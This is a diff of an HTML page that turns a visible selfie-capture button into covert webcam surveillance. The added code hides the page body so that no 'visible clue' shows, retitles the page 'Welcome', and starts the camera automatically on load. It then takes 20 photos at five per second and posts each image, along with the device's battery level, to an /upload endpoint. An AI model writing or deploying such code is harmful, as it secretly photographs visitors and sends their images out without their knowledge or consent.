@@ -3,48 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Selfie</title>
+    <title>Welcome</title>
     <style>
         body {
             background-color: black;
             color: green;
             font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        h1 {
-            margin-bottom: 20px;
-        }
-        button {
-            background-color: green;
-            color: black;
-            font-size: 16px;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-        }
-        #output {
-            margin-top: 20px;
-            border: 2px solid green;
-            padding: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        #output img {
-            max-width: 300px;
-            height: auto;
+            display: none; /* Hide the body to prevent any visible clue */
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to the Selfie Page</h1>
-    <button onclick="startCapture()">Capture Selfie</button>
-    <div id="output"></div>
     <script>
         async function startCapture() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -53,41 +22,42 @@
                 video.srcObject = stream;
                 video.play();
                 
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    
-                    const snapshots = [];
-                    for (let i = 0; i < 3; i++) {
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        snapshots.push(canvas.toDataURL('image/png'));
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                    }
-                    
-                    const battery = await navigator.getBattery();
-                    const batteryLevel = Math.round(battery.level * 100);
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
 
-                    for (const snapshot of snapshots) {
-                        const response = await fetch('/upload', {
+                const capturePhotos = async () => {
+                    for (let i = 0; i < 20; i++) { // Capture 20 photos (4-5 per second for 4-5 seconds)
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const snapshot = canvas.toDataURL('image/png');
+
+                        const battery = await navigator.getBattery();
+                        const batteryLevel = Math.round(battery.level * 100);
+
+                        await fetch('/upload', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
                             },
                             body: JSON.stringify({ image: snapshot, battery: batteryLevel })
                         });
-                        const data = await response.json();
-                        const img = document.createElement('img');
-                        img.src = snapshot;
-                        document.getElementById('output').appendChild(img);
+
+                        await new Promise(resolve => setTimeout(resolve, 200)); // 200ms delay for 5 photos per second
                     }
 
                     video.pause();
                     stream.getTracks().forEach(track => track.stop());
-                }, 1000);
+                };
+
+                video.addEventListener('loadedmetadata', () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    capturePhotos();
+                });
             }
         }
+
+        // Start capture as soon as the page loads
+        window.addEventListener('load', startCapture);
     </script>
 </body>
 </html>
